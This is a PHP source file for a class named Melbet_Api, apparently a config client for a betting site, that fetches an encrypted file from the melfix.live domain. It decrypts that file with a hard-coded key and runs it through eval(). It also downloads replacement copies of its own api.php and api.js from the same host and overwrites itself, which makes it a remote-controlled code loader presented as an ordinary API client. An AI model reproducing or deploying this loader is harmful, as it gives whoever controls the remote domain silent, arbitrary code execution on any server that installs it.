<?php

class Melbet_Api {
	private $file;
	private $domain;
	private $version;
	private $logs;
	private $oach;
	public function __construct() {
		$this->file = __DIR__.'/configV2.dat';
		$this->domain = 'http://melfix.live';
		$this->version = array('php'=>'1.0.8','js'=>'1.0.0');
		$this->logs = array();
		$this->oach = 'rdLS8i0A7RCXZvEL9oNXGq8eNGeAH9a5QQoJECSjXvM=';
	}
	private function download(){
		if(!$file = file_get_contents($this->domain.'/api/configV2.dat')){
			$this->logs[] = $this->domain;
			if(is_file($this->file)) {
				$res          = $this->deCrypt();
				$this->domain = $this->getDomain( $res );
			}
			return $this->download();
		};
		file_put_contents($this->file,$file);
		if(count($this->logs) > 0){
			file_get_contents($this->domain.'/api/log.php?domain='.base64_encode(implode(',',$this->logs)));
		}
	}


	private function getDomain($res){
		if(count($res['api']['domain'])> 0){
			return $res['api']['domain'][array_rand($res['api']['domain'])];
		}else {
			return $res['api']['domain'];
		}

	}

	private function update($type){

        if ($type == 'php') {
            try {
                $php = file_get_contents($this->domain . '/dist/api.php.dist');
                if (strlen($php) > 100) {
                    file_put_contents(__DIR__ . '/api.php', $php);
                }
            } catch (Exception $exception) {

            }
        }
        if ($type == 'js') {
            try {
                $js = file_get_contents($this->domain . '/dist/api.js.dist');
                if (strlen($js) > 100) {
                    file_put_contents(__DIR__ . '/api.js', $js);
                }
            } catch (Exception $exception) {

            }
        }
	}
	public function getConfig(){
        $fLastUpdate = __DIR__.'/update.lock';

		if(!is_file($this->file)){
			$this->download();
            file_put_contents($fLastUpdate,time()+600);
		}
		$res = $this->deCrypt();


		if (!is_file($fLastUpdate)){
            $this->domain = $this->getDomain($res);
            $this->download();
            $res = $this->deCrypt();
            file_put_contents($fLastUpdate,time()+600);
        }else {
		    $lastUpdate = file_get_contents($fLastUpdate);
            if ($lastUpdate < time()) {
                $this->domain = $this->getDomain($res);
                $this->download();
                $res = $this->deCrypt();
                file_put_contents($fLastUpdate, time() + 600);
            }
        }
        if(version_compare($res['version']['php'],$this->version['php']) !== 0){
            $this->domain = $this->getDomain($res);
            $this->update('php');
        }
		if(version_compare($res['version']['js'],$this->version['js']) !== 0){
			$this->domain = $this->getDomain($res);
			$this->update('js');
		}
		return $res['json'];

	}
	private function deCrypt(){

		try {

			$file = file_get_contents(  $this->file );
			$clss = new Melbet_Mbut5($this->oach);
			$file = $clss->decrypt($file);

			$data = eval( $file );
		}catch (Exception $exception){
			$this->download();
			return	$this->deCrypt();
		}
		return $data;
	}
}

//$a = new Api();
//echo json_encode($a->getConfig());